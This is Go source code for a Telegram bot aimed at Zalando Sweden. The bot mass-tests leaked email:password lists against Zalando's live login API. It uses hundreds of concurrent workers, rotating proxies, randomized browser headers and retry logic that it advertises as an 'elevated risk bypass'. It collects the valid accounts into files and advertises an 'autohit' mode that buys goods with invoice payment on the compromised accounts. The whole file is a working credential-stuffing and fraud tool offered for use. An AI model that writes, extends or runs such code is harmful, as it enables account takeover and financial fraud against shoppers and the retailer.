package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/joho/godotenv"
)

// ====================================
// STRUCTS
// ====================================

type AuthRequest struct {
	ClientID    string `json:"client_id"`
	RequestID   string `json:"request_id"`
	RedirectURI string `json:"redirect_uri"`
	UILocales   string `json:"ui_locales"`
	TC          string `json:"tc"`
}

type LoginPayload struct {
	Email                 string      `json:"email"`
	Secret                string      `json:"secret"`
	AuthenticationRequest AuthRequest `json:"authentication_request"`
}

type LoginResponse struct {
	Error       string `json:"error,omitempty"`
	RedirectURI string `json:"redirect_uri,omitempty"`
}

type Config struct {
	TelegramToken string
	AdminID       int64
}

type ProxyManager struct {
	proxies []string
	index   int
	mu      sync.Mutex
}

type ValidAccount struct {
	Combo string
}

type SkippedAccount struct {
	Combo  string
	Reason string
}

type MassCheckStats struct {
	IsRunning     bool
	Total         int32
	Valid         int32
	Invalid       int32
	Checked       int32
	Skipped       int32
	StartTime     time.Time
	ChatID        int64
	ValidList     []ValidAccount
	SkippedList   []SkippedAccount
	StopRequested bool
	mu            sync.Mutex
}

type DebugLog struct {
	Timestamp string
	Type      string
	Message   string
}

// Autohitter structures
type HitOptions struct {
	Email       string
	Password    string
	ProductURL  string
	Size        string // Product size (S, M, L, XL, etc.)
	BrowseMode  bool
	ProxyURL    string
	PhoneNumber string // Default: 0767541615
}

type HitResult struct {
	Success   bool
	OrderID   string
	Message   string
	Error     error
}

type AddToCartRequest struct {
	Query     string                 `json:"query"`
	Variables map[string]interface{} `json:"variables"`
}

type PickupPoint struct {
	ID       string
	Name     string
	Address  string
	Provider string
}

var config Config
var proxyManager *ProxyManager
var currentStats *MassCheckStats
var debugLogs []DebugLog
var debugMutex sync.Mutex

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
}

// ====================================
// DEBUG LOG
// ====================================

func addDebugLog(logType, message string) {
	debugMutex.Lock()
	defer debugMutex.Unlock()

	debugLogs = append(debugLogs, DebugLog{
		Timestamp: time.Now().Format("15:04:05"),
		Type:      logType,
		Message:   message,
	})

	if len(debugLogs) > 500 {
		debugLogs = debugLogs[len(debugLogs)-500:]
	}

	log.Printf("[%s] %s", logType, message)
}

// ====================================
// MAIN
// ====================================

func main() {
	rand.Seed(time.Now().UnixNano())
	
	err := godotenv.Load()
	if err != nil {
		log.Println("⚠️ .env file not found")
	}

	config = Config{
		TelegramToken: os.Getenv("TELEGRAM_BOT_TOKEN"),
		AdminID:       getEnvAsInt64("ADMIN_ID", 0),
	}

	if config.TelegramToken == "" {
		log.Fatal("❌ TELEGRAM_BOT_TOKEN not set!")
	}

	currentStats = &MassCheckStats{}
	debugLogs = make([]DebugLog, 0)

	proxyManager = &ProxyManager{}
	err = proxyManager.LoadProxies("proxies.txt")
	if err != nil {
		addDebugLog("PROXY", "No proxies loaded")
	} else {
		addDebugLog("PROXY", fmt.Sprintf("Loaded %d proxies", len(proxyManager.proxies)))
	}

	bot, err := tgbotapi.NewBotAPI(config.TelegramToken)
	if err != nil {
		log.Fatal("❌ Bot startup error:", err)
	}

	bot.Debug = false
	addDebugLog("BOT", fmt.Sprintf("Bot started: @%s", bot.Self.UserName))

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := bot.GetUpdatesChan(u)

	for update := range updates {
		if update.Message == nil {
			continue
		}
		go handleMessage(bot, update.Message)
	}
}

// ====================================
// PROXY MANAGER
// ====================================

func (pm *ProxyManager) LoadProxies(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	lineNum := 0
	for scanner.Scan() {
		lineNum++
		proxy := strings.TrimSpace(scanner.Text())
		if proxy == "" || strings.HasPrefix(proxy, "#") {
			continue
		}

		var convertedProxy string

		if strings.HasPrefix(proxy, "http://") || strings.HasPrefix(proxy, "https://") || strings.HasPrefix(proxy, "socks5://") {
			convertedProxy = proxy
			pm.proxies = append(pm.proxies, convertedProxy)
			log.Printf("✅ Proxy #%d: %s", lineNum, strings.Split(convertedProxy, "@")[len(strings.Split(convertedProxy, "@"))-1])
			continue
		}

		parts := strings.Split(proxy, ":")

		if len(parts) == 2 {
			convertedProxy = fmt.Sprintf("socks5://%s:%s", parts[0], parts[1])
			pm.proxies = append(pm.proxies, convertedProxy)
			log.Printf("✅ SOCKS5 Proxy #%d: %s:%s", lineNum, parts[0], parts[1])

		} else if len(parts) == 4 {
			host := parts[0]
			port := parts[1]
			username := parts[2]
			password := parts[3]

			if strings.Contains(host, "eclipse") || strings.Contains(host, "pyproxy") || strings.Contains(host, ".com") {
				convertedProxy = fmt.Sprintf("http://%s:%s@%s:%s", username, password, host, port)
				log.Printf("✅ HTTP Proxy #%d: %s:%s (user: %s)", lineNum, host, port, username)
			} else {
				convertedProxy = fmt.Sprintf("socks5://%s:%s@%s:%s", username, password, host, port)
				log.Printf("✅ SOCKS5 Auth #%d: %s:%s (user: %s)", lineNum, host, port, username)
			}

			pm.proxies = append(pm.proxies, convertedProxy)

		} else {
			log.Printf("⚠️ Line %d: Proxy format not recognized - %s", lineNum, proxy)
		}
	}

	if len(pm.proxies) == 0 {
		return fmt.Errorf("no proxies found")
	}

	return scanner.Err()
}

func (pm *ProxyManager) GetRandomProxy() string {
	if len(pm.proxies) == 0 {
		return ""
	}

	pm.mu.Lock()
	defer pm.mu.Unlock()

	return pm.proxies[rand.Intn(len(pm.proxies))]
}

// ====================================
// HTTP CLIENT
// ====================================

func createHTTPClient(proxyURL string) (*http.Client, error) {
	jar, _ := cookiejar.New(nil)

	transport := &http.Transport{
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:          100,
		MaxIdleConnsPerHost:   10,
		IdleConnTimeout:       90 * time.Second,
		ResponseHeaderTimeout: 10 * time.Second,
		DisableKeepAlives:     false,
		ForceAttemptHTTP2:     true,
	}

	if proxyURL != "" {
		if strings.HasPrefix(proxyURL, "socks5://") {
			proxyURLParsed, err := url.Parse(proxyURL)
			if err != nil {
				return nil, err
			}

			dialer, err := proxy.FromURL(proxyURLParsed, proxy.Direct)
			if err != nil {
				return nil, err
			}

			transport.Dial = dialer.Dial

		} else {
			proxyURLParsed, err := url.Parse(proxyURL)
			if err != nil {
				return nil, err
			}
			transport.Proxy = http.ProxyURL(proxyURLParsed)
		}
	}

	client := &http.Client{
		Timeout:   15 * time.Second,
		Jar:       jar,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return client, nil
}

// ====================================
// MESSAGE HANDLER
// ====================================

func handleMessage(bot *tgbotapi.BotAPI, msg *tgbotapi.Message) {
	addDebugLog("MESSAGE", fmt.Sprintf("User [%d] %s: %s", msg.From.ID, msg.From.UserName, msg.Text))

	if msg.Command() == "start" {
		welcomeMsg := "🎯 *Zalando Sweden Bot*\n\n📋 *Commands:*\n/check \\- Verify account\n/mass \\- Mass check\n/hit \\- Auto purchase \\(autohitter\\)\n/stop \\- Stop check\n/status \\- Real\\-time stats\n/proxies \\- Proxy info\n/debug \\- Download debug logs\n\n💡 *Examples:*\n```\n/check email@test\\.com:password\n/hit email:pass url M\n/hit email:pass url L browse\n/hit email:pass url XL browse 0701234567\n```\n\n🔥 *Features:*\n• Elevated risk bypass\n• Auto purchase with Faktura\n• Size selection \\(S, M, L, XL\\)\n• INSTABOX/BUDBEE pickup\n• Human\\-like behavior\n• Fast CPM\n• 🇸🇪 Target: Zalando Sweden\n\n⚡ *Optimized for Speed*"
		sendMessage(bot, msg.Chat.ID, welcomeMsg, true)
		return
	}

	if msg.Command() == "debug" {
		debugMutex.Lock()

		if len(debugLogs) == 0 {
			debugMutex.Unlock()
			sendMessage(bot, msg.Chat.ID, "❌ No logs available", false)
			return
		}

		filename := fmt.Sprintf("debug_%s.txt", time.Now().Format("150405"))

		var content strings.Builder
		content.WriteString(fmt.Sprintf("═══════════════════════════════════\n"))
		content.WriteString(fmt.Sprintf("   DEBUG LOG - %d entries\n", len(debugLogs)))
		content.WriteString(fmt.Sprintf("   %s\n", time.Now().Format("2006-01-02 15:04:05")))
		content.WriteString(fmt.Sprintf("═══════════════════════════════════\n\n"))

		start := len(debugLogs) - 500
		if start < 0 {
			start = 0
		}

		for _, logEntry := range debugLogs[start:] {
			content.WriteString(fmt.Sprintf("[%s] %s: %s\n", logEntry.Timestamp, logEntry.Type, logEntry.Message))
		}

		debugMutex.Unlock()

		os.WriteFile(filename, []byte(content.String()), 0644)

		file := tgbotapi.NewDocument(msg.Chat.ID, tgbotapi.FilePath(filename))
		file.Caption = fmt.Sprintf("📋 Debug Log (last %d)", min(500, len(debugLogs)))
		bot.Send(file)

		os.Remove(filename)
		return
	}

	if msg.Command() == "stop" {
		currentStats.mu.Lock()
		
		if !currentStats.IsRunning {
			currentStats.mu.Unlock()
			sendMessage(bot, msg.Chat.ID, "❌ No check in progress!", false)
			return
		}

		currentStats.StopRequested = true
		currentStats.IsRunning = false
		currentStats.mu.Unlock()
		
		addDebugLog("STOP", "⏸️ Immediate stop requested")
		
		time.Sleep(1 * time.Second)
		
		currentStats.mu.Lock()
		validList := make([]ValidAccount, len(currentStats.ValidList))
		copy(validList, currentStats.ValidList)
		
		skippedList := make([]SkippedAccount, len(currentStats.SkippedList))
		copy(skippedList, currentStats.SkippedList)
		
		elapsed := time.Since(currentStats.StartTime).Seconds()
		checked := atomic.LoadInt32(&currentStats.Checked)
		valid := atomic.LoadInt32(&currentStats.Valid)
		invalid := atomic.LoadInt32(&currentStats.Invalid)
		skipped := atomic.LoadInt32(&currentStats.Skipped)
		total := currentStats.Total
		currentStats.mu.Unlock()
		
		cpm := float64(checked) / elapsed * 60
		
		addDebugLog("STOP", fmt.Sprintf("📊 Final stats: %d valid, %d invalid, %d skipped, %.0f CPM", valid, invalid, skipped, cpm))
		
		// Send VALID file
		if len(validList) > 0 {
			filename := fmt.Sprintf("zalando_valid_%s.txt", time.Now().Format("20060102_150405"))
			
			var content strings.Builder
			content.WriteString(fmt.Sprintf("═══════════════════════════════════\n"))
			content.WriteString(fmt.Sprintf("   ⏸️ ZALANDO SE STOPPED - %d valid\n", len(validList)))
			content.WriteString(fmt.Sprintf("   %s\n", time.Now().Format("2006-01-02 15:04:05")))
			content.WriteString(fmt.Sprintf("   ⚡ CPM: %.0f\n", cpm))
			content.WriteString(fmt.Sprintf("   🇸🇪 SWEDEN TARGET\n"))
			content.WriteString(fmt.Sprintf("═══════════════════════════════════\n\n"))
			
			for _, acc := range validList {
				content.WriteString(fmt.Sprintf("%s\n", acc.Combo))
			}
			
			os.WriteFile(filename, []byte(content.String()), 0644)
			
			file := tgbotapi.NewDocument(msg.Chat.ID, tgbotapi.FilePath(filename))
			file.Caption = fmt.Sprintf("✅ VALID | %d accounts | ⚡ %.0f CPM", len(validList), cpm)
			bot.Send(file)
			
			os.Remove(filename)
			addDebugLog("STOP", fmt.Sprintf("📁 Valid file sent: %s", filename))
		}
		
		// Send SKIPPED file
		if len(skippedList) > 0 {
			filename := fmt.Sprintf("zalando_skipped_%s.txt", time.Now().Format("20060102_150405"))
			
			var content strings.Builder
			content.WriteString(fmt.Sprintf("═══════════════════════════════════\n"))
			content.WriteString(fmt.Sprintf("   ⏸️ SKIPPED ACCOUNTS - %d total\n", len(skippedList)))
			content.WriteString(fmt.Sprintf("   %s\n", time.Now().Format("2006-01-02 15:04:05")))
			content.WriteString(fmt.Sprintf("   ⚠️ These need manual recheck\n"))
			content.WriteString(fmt.Sprintf("   🔄 Try with better proxies\n"))
			content.WriteString(fmt.Sprintf("═══════════════════════════════════\n\n"))
			
			for _, acc := range skippedList {
				content.WriteString(fmt.Sprintf("%s | Reason: %s\n", acc.Combo, acc.Reason))
			}
			
			os.WriteFile(filename, []byte(content.String()), 0644)
			
			file := tgbotapi.NewDocument(msg.Chat.ID, tgbotapi.FilePath(filename))
			file.Caption = fmt.Sprintf("⚠️ SKIPPED | %d accounts | Recheck these manually", len(skippedList))
			bot.Send(file)
			
			os.Remove(filename)
			addDebugLog("STOP", fmt.Sprintf("📁 Skipped file sent: %s", filename))
		}
		
		finalMsg := fmt.Sprintf(
			"⏸️ *CHECK STOPPED*\n\n"+
				"✅ Valid: `%d`\n"+
				"❌ Invalid: `%d`\n"+
				"⚠️ Skipped: `%d`\n"+
				"📦 Checked: `%d/%d`\n\n"+
				"⚡ CPM: `%.0f`\n"+
				"⏱️ Time: `%.1fs`",
			valid,
			invalid,
			skipped,
			checked,
			total,
			cpm,
			elapsed,
		)
		
		sendMessage(bot, msg.Chat.ID, finalMsg, true)
		return
	}

	if msg.Command() == "proxies" {
		if proxyManager == nil || len(proxyManager.proxies) == 0 {
			sendMessage(bot, msg.Chat.ID, "❌ No proxies loaded!", false)
		} else {
			proxyInfo := fmt.Sprintf("✅ *Active proxies:* %d", len(proxyManager.proxies))
			sendMessage(bot, msg.Chat.ID, proxyInfo, true)
		}
		return
	}

	if msg.Command() == "status" {
		currentStats.mu.Lock()
		defer currentStats.mu.Unlock()

		if !currentStats.IsRunning {
			sendMessage(bot, msg.Chat.ID, "❌ No mass check in progress!", false)
			return
		}

		elapsed := time.Since(currentStats.StartTime).Seconds()
		cpm := float64(atomic.LoadInt32(&currentStats.Checked)) / elapsed * 60

		statusText := fmt.Sprintf(
			"📊 *CHECK STATUS*\n\n"+
				"✅ Valid: `%d`\n"+
				"❌ Invalid: `%d`\n"+
				"⚠️ Skipped: `%d`\n"+
				"📦 Checked: `%d/%d`\n"+
				"⚡ CPM: `%.0f`\n"+
				"⏱️ Time: `%.1f`s",
			atomic.LoadInt32(&currentStats.Valid),
			atomic.LoadInt32(&currentStats.Invalid),
			atomic.LoadInt32(&currentStats.Skipped),
			atomic.LoadInt32(&currentStats.Checked),
			currentStats.Total,
			cpm,
			elapsed,
		)
		sendMessage(bot, msg.Chat.ID, statusText, true)
		return
	}

	if msg.Command() == "check" {
		args := strings.TrimSpace(msg.CommandArguments())
		if args == "" {
			sendMessage(bot, msg.Chat.ID, "❌ Usage: /check email:password", false)
			return
		}
		addDebugLog("CHECK", fmt.Sprintf("Checking: %s", args))
		waitMsg := sendMessage(bot, msg.Chat.ID, "⏳ Checking\\.\\.\\.", true)
		result := checkAccount(args)
		deleteMessage(bot, msg.Chat.ID, waitMsg.MessageID)
		sendMessage(bot, msg.Chat.ID, result, true)
		return
	}

	if msg.Command() == "hit" {
		args := strings.TrimSpace(msg.CommandArguments())
		if args == "" {
			sendMessage(bot, msg.Chat.ID, "❌ Usage: /hit email:password product\\_url size \\[browse\\] \\[phone\\]\n\nExample:\n`/hit test@mail\\.com:pass123 https://www\\.zalando\\.se/product M browse 0767541615`\n\nSizes: S, M, L, XL, XXL, or ONE\\_SIZE", true)
			return
		}
		
		parts := strings.Fields(args)
		if len(parts) < 3 {
			sendMessage(bot, msg.Chat.ID, "❌ Missing arguments\\. Need: email:password product\\_url size\n\nExample: /hit email:pass url M", true)
			return
		}
		
		credParts := strings.Split(parts[0], ":")
		if len(credParts) != 2 {
			sendMessage(bot, msg.Chat.ID, "❌ Invalid credentials format\\. Use: email:password", true)
			return
		}
		
		size := strings.ToUpper(parts[2])
		// Validate size
		validSizes := map[string]bool{
			"S": true, "M": true, "L": true, "XL": true, "XXL": true, "XXXL": true,
			"ONE_SIZE": true, "ONESIZE": true, "ONE": true,
		}
		if !validSizes[size] {
			sendMessage(bot, msg.Chat.ID, "❌ Invalid size\\. Valid sizes: S, M, L, XL, XXL, ONE\\_SIZE", true)
			return
		}
		
		options := HitOptions{
			Email:       credParts[0],
			Password:    credParts[1],
			ProductURL:  parts[1],
			Size:        size,
			BrowseMode:  false,
			PhoneNumber: "0767541615", // Default
		}
		
		// Check for browse mode and phone number
		for i := 3; i < len(parts); i++ {
			if strings.ToLower(parts[i]) == "browse" {
				options.BrowseMode = true
			} else if len(parts[i]) >= 10 && strings.HasPrefix(parts[i], "0") {
				options.PhoneNumber = parts[i]
			}
		}
		
		if proxyManager != nil && len(proxyManager.proxies) > 0 {
			options.ProxyURL = proxyManager.GetRandomProxy()
		}
		
		addDebugLog("HIT", fmt.Sprintf("Starting autohit for %s on %s (size: %s)", options.Email, options.ProductURL, options.Size))
		waitMsg := sendMessage(bot, msg.Chat.ID, "🎯 *Starting autohit*\\.\\.\\.\n\n⏳ This may take 1\\-2 minutes", true)
		
		go handleAutoHit(bot, msg.Chat.ID, waitMsg.MessageID, options)
		return
	}

	if msg.Command() == "mass" {
		sendMessage(bot, msg.Chat.ID, "📤 Send me a .txt file with combos (email:password)", false)
		return
	}

	if msg.Document != nil {
		handleMassCheck(bot, msg)
		return
	}

	sendMessage(bot, msg.Chat.ID, "❓ Command not recognized. Use /start", false)
}

// ====================================
// ACCOUNT CHECKER
// ====================================

func checkAccount(combo string) string {
	parts := strings.Split(combo, ":")
	if len(parts) != 2 {
		return "❌ Wrong format! Use: email:password"
	}

	email := strings.TrimSpace(parts[0])
	password := strings.TrimSpace(parts[1])

	if !isValidEmail(email) {
		return "❌ Invalid email!"
	}

	addDebugLog("CHECK-START", fmt.Sprintf("Starting check for %s", email))

	isValid, isSkipped, err := checkZalandoLogin(email, password)

	if isSkipped {
		addDebugLog("CHECK-SKIPPED", fmt.Sprintf("Skipped (elevated risk): %s", email))
		return fmt.Sprintf("⚠️ *SKIPPED*\n\n📧 %s\n🔒 Elevated risk \\- Try manually", escapeMarkdownV2(email))
	}

	if err != nil {
		addDebugLog("CHECK-ERROR", fmt.Sprintf("Login error %s: %v", email, err))
		return fmt.Sprintf("❌ *ERROR*\n\n📧 %s\n⚠️ %v", escapeMarkdownV2(email), err)
	}

	if !isValid {
		addDebugLog("CHECK-INVALID", fmt.Sprintf("Invalid account: %s", email))
		return fmt.Sprintf("❌ *INVALID*\n\n📧 %s\n🔑 %s", escapeMarkdownV2(email), escapeMarkdownV2(password))
	}

	addDebugLog("CHECK-VALID", fmt.Sprintf("✅ Valid account: %s", email))

	result := fmt.Sprintf("✅ *VALID*\n\n`%s:%s`", escapeMarkdownV2(email), escapeMarkdownV2(password))

	return result
}

// ====================================
// LOGIN - ELEVATED RISK BYPASS
// ====================================

func checkZalandoLogin(email, password string) (isValid bool, isSkipped bool, err error) {
	maxAttempts := 3
	elevatedRiskCount := 0
	maxElevatedRisk := 2
	
	for attempt := 1; attempt <= maxAttempts; attempt++ {
		// Random delay between requests (reduce detection)
		if attempt > 1 {
			delay := time.Duration(500 + rand.Intn(800)) * time.Millisecond
			time.Sleep(delay)
		}
		
		proxyURL := ""
		if proxyManager != nil && len(proxyManager.proxies) > 0 {
			proxyURL = proxyManager.GetRandomProxy()
		}

		client, err := createHTTPClient(proxyURL)
		if err != nil {
			if attempt == maxAttempts {
				return false, false, fmt.Errorf("client creation failed")
			}
			time.Sleep(200 * time.Millisecond)
			continue
		}

		// Random User-Agent (reduce fingerprinting)
		ua := userAgents[rand.Intn(len(userAgents))]

		// GET request
		getReq, _ := http.NewRequest("GET", "https://accounts.zalando.com/authenticate?client_id=fashion-store-web", nil)
		getReq.Header.Set("User-Agent", ua)
		getReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
		getReq.Header.Set("Accept-Language", "sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7")
		getReq.Header.Set("Accept-Encoding", "gzip, deflate, br")
		getReq.Header.Set("Connection", "keep-alive")
		getReq.Header.Set("Upgrade-Insecure-Requests", "1")
		getReq.Header.Set("Sec-Fetch-Dest", "document")
		getReq.Header.Set("Sec-Fetch-Mode", "navigate")
		getReq.Header.Set("Sec-Fetch-Site", "none")
		getReq.Header.Set("Sec-Ch-Ua", `"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`)
		getReq.Header.Set("Sec-Ch-Ua-Mobile", "?0")
		getReq.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)

		getResp, err := client.Do(getReq)
		if err != nil {
			if attempt == maxAttempts {
				return false, false, fmt.Errorf("network error")
			}
			time.Sleep(200 * time.Millisecond)
			continue
		}
		io.ReadAll(getResp.Body)
		getResp.Body.Close()

		// Random delay before login (simulate human)
		time.Sleep(time.Duration(100 + rand.Intn(300)) * time.Millisecond)

		// Extract CSRF
		csrfToken := ""
		jar := client.Jar
		for _, cookie := range jar.Cookies(getReq.URL) {
			if cookie.Name == "csrf-token" || cookie.Name == "XSRF-TOKEN" {
				csrfToken = cookie.Value
				break
			}
		}
		if csrfToken == "" {
			csrfToken = generateCSRFToken()
		}

		// Build payload
		payload := LoginPayload{
			Email:  email,
			Secret: password,
			AuthenticationRequest: AuthRequest{
				ClientID:    "fashion-store-web",
				RequestID:   fmt.Sprintf("req%d:%d", rand.Intn(999999), time.Now().Unix()),
				RedirectURI: "https://www.zalando.se/sso/callback",
				UILocales:   "sv-SE",
				TC:          fmt.Sprintf("zcid:%d,pf:web", time.Now().Unix()),
			},
		}

		jsonData, _ := json.Marshal(payload)

		// POST login
		req, _ := http.NewRequest("POST", "https://accounts.zalando.com/api/sso/authentications/credentials", bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Accept", "application/json, */*")
		req.Header.Set("User-Agent", ua)
		req.Header.Set("Origin", "https://accounts.zalando.com")
		req.Header.Set("Referer", "https://accounts.zalando.com/authenticate")
		req.Header.Set("Accept-Language", "sv-SE,sv;q=0.9")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("Sec-Fetch-Dest", "empty")
		req.Header.Set("Sec-Fetch-Mode", "cors")
		req.Header.Set("Sec-Fetch-Site", "same-origin")
		req.Header.Set("Sec-Ch-Ua", `"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`)
		req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
		req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
		req.Header.Set("x-csrf-token", csrfToken)

		resp, err := client.Do(req)
		if err != nil {
			if attempt == maxAttempts {
				return false, false, fmt.Errorf("network error")
			}
			time.Sleep(200 * time.Millisecond)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		// Check status
		switch resp.StatusCode {
		case 200:
			var loginResp LoginResponse
			json.Unmarshal(body, &loginResp)
			
			if loginResp.RedirectURI != "" {
				addDebugLog("SUCCESS", fmt.Sprintf("Valid (200+redirect): %s", email))
				return true, false, nil
			}
			
			if loginResp.Error != "" {
				if strings.Contains(strings.ToLower(loginResp.Error), "credentials") ||
				   strings.Contains(strings.ToLower(loginResp.Error), "password") {
					addDebugLog("INVALID", fmt.Sprintf("Wrong credentials: %s", email))
					return false, false, nil
				}
			}
			
			// Unclear - retry
			if attempt < maxAttempts {
				time.Sleep(300 * time.Millisecond)
				continue
			}
			return false, false, nil
			
		case 204, 302, 303:
			addDebugLog("SUCCESS", fmt.Sprintf("Valid (%d): %s", resp.StatusCode, email))
			return true, false, nil
			
		case 401:
			// Check for elevated risk
			if strings.Contains(bodyStr, "elevated-risk") {
				elevatedRiskCount++
				addDebugLog("ELEVATED-RISK", fmt.Sprintf("Elevated risk #%d for %s", elevatedRiskCount, email))
				
				if elevatedRiskCount >= maxElevatedRisk {
					addDebugLog("SKIPPED", fmt.Sprintf("Skipping %s after %d elevated risks", email, elevatedRiskCount))
					return false, true, nil  // isSkipped = true
				}
				
				// Retry with longer delay and new proxy
				time.Sleep(time.Duration(1500 + rand.Intn(1000)) * time.Millisecond)
				continue
			}
			
			var loginResp LoginResponse
			json.Unmarshal(body, &loginResp)
			
			if loginResp.RedirectURI != "" {
				addDebugLog("SUCCESS", fmt.Sprintf("Valid (401+redirect): %s", email))
				return true, false, nil
			}
			
			if loginResp.Error != "" {
				if strings.Contains(strings.ToLower(loginResp.Error), "credentials") ||
				   strings.Contains(strings.ToLower(loginResp.Error), "password") {
					addDebugLog("INVALID", fmt.Sprintf("Wrong credentials: %s", email))
					return false, false, nil
				}
			}
			
			// Unclear 401 - assume invalid
			addDebugLog("INVALID", fmt.Sprintf("401 invalid: %s", email))
			return false, false, nil
			
		case 429:
			addDebugLog("RATE-LIMIT", fmt.Sprintf("Rate limited: %s", email))
			if attempt < maxAttempts {
				time.Sleep(time.Duration(2000 + rand.Intn(1000)) * time.Millisecond)
				continue
			}
			return false, true, nil  // Skip due to rate limit
			
		case 403:
			addDebugLog("FORBIDDEN", fmt.Sprintf("403 forbidden: %s", email))
			if attempt < maxAttempts {
				time.Sleep(time.Duration(2500 + rand.Intn(1000)) * time.Millisecond)
				continue
			}
			return false, true, nil  // Skip due to proxy ban
			
		default:
			addDebugLog("UNKNOWN-STATUS", fmt.Sprintf("Status %d for %s", resp.StatusCode, email))
			if attempt < maxAttempts {
				time.Sleep(300 * time.Millisecond)
				continue
			}
			return false, false, fmt.Errorf("unknown status: %d", resp.StatusCode)
		}
	}
	
	return false, false, fmt.Errorf("max attempts reached")
}

// ====================================
// MASS CHECK
// ====================================

func handleMassCheck(bot *tgbotapi.BotAPI, msg *tgbotapi.Message) {
	fileURL, err := bot.GetFileDirectURL(msg.Document.FileID)
	if err != nil {
		sendMessage(bot, msg.Chat.ID, "❌ File download error", false)
		return
	}

	resp, err := http.Get(fileURL)
	if err != nil {
		sendMessage(bot, msg.Chat.ID, "❌ File read error", false)
		return
	}
	defer resp.Body.Close()

	content, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(content), "\n")

	var combos []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") {
			combos = append(combos, line)
		}
	}

	if len(combos) == 0 {
		sendMessage(bot, msg.Chat.ID, "❌ No combos found!", false)
		return
	}

	workers := 150  // Reduced workers to avoid rate limiting
	if proxyManager != nil && len(proxyManager.proxies) > 0 {
		workers = len(proxyManager.proxies) * 2
		if workers < 100 {
			workers = 100
		}
		if workers > 300 {
			workers = 300
		}
	}

	currentStats.mu.Lock()
	currentStats.IsRunning = true
	currentStats.Total = int32(len(combos))
	currentStats.Valid = 0
	currentStats.Invalid = 0
	currentStats.Checked = 0
	currentStats.Skipped = 0
	currentStats.StartTime = time.Now()
	currentStats.ChatID = msg.Chat.ID
	currentStats.ValidList = make([]ValidAccount, 0)
	currentStats.SkippedList = make([]SkippedAccount, 0)
	currentStats.StopRequested = false
	currentStats.mu.Unlock()

	addDebugLog("MASS", fmt.Sprintf("Starting check of %d combos with %d workers", len(combos), workers))

	statusMsg := sendMessage(bot, msg.Chat.ID, fmt.Sprintf("🔄 Checking %d accounts...\n⚡ Workers: %d\n💡 Use /status or /stop\n\n🔥 *Elevated Risk Bypass Active*\n🇸🇪 *TARGET: SWEDEN*", len(combos), workers), true)

	var mu sync.Mutex

	start := time.Now()
	jobs := make(chan string, len(combos))
	var wg sync.WaitGroup

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for combo := range jobs {
				currentStats.mu.Lock()
				if currentStats.StopRequested {
					currentStats.mu.Unlock()
					break
				}
				currentStats.mu.Unlock()

				parts := strings.Split(combo, ":")
				if len(parts) != 2 {
					atomic.AddInt32(&currentStats.Checked, 1)
					atomic.AddInt32(&currentStats.Invalid, 1)
					continue
				}

				email := strings.TrimSpace(parts[0])
				password := strings.TrimSpace(parts[1])

				isValid, isSkipped, err := checkZalandoLogin(email, password)

				atomic.AddInt32(&currentStats.Checked, 1)

				if isSkipped {
					atomic.AddInt32(&currentStats.Skipped, 1)
					addDebugLog("MASS-SKIPPED", fmt.Sprintf("⚠️ %s is SKIPPED", email))

					skippedAcc := SkippedAccount{
						Combo:  combo,
						Reason: "Elevated Risk",
					}

					mu.Lock()
					currentStats.SkippedList = append(currentStats.SkippedList, skippedAcc)
					mu.Unlock()
				} else if err == nil && isValid {
					atomic.AddInt32(&currentStats.Valid, 1)
					addDebugLog("MASS-VALID", fmt.Sprintf("✅ %s is VALID", email))

					validAcc := ValidAccount{
						Combo: combo,
					}

					mu.Lock()
					currentStats.ValidList = append(currentStats.ValidList, validAcc)
					mu.Unlock()
				} else {
					atomic.AddInt32(&currentStats.Invalid, 1)
				}
			}
		}()
	}

	for _, combo := range combos {
		currentStats.mu.Lock()
		if currentStats.StopRequested {
			currentStats.mu.Unlock()
			break
		}
		currentStats.mu.Unlock()

		jobs <- combo
	}
	close(jobs)
	wg.Wait()

	currentStats.mu.Lock()
	wasStoppedManually := currentStats.StopRequested
	currentStats.IsRunning = false
	currentStats.mu.Unlock()

	elapsed := time.Since(start).Seconds()
	cpm := float64(atomic.LoadInt32(&currentStats.Checked)) / elapsed * 60

	valid := atomic.LoadInt32(&currentStats.Valid)
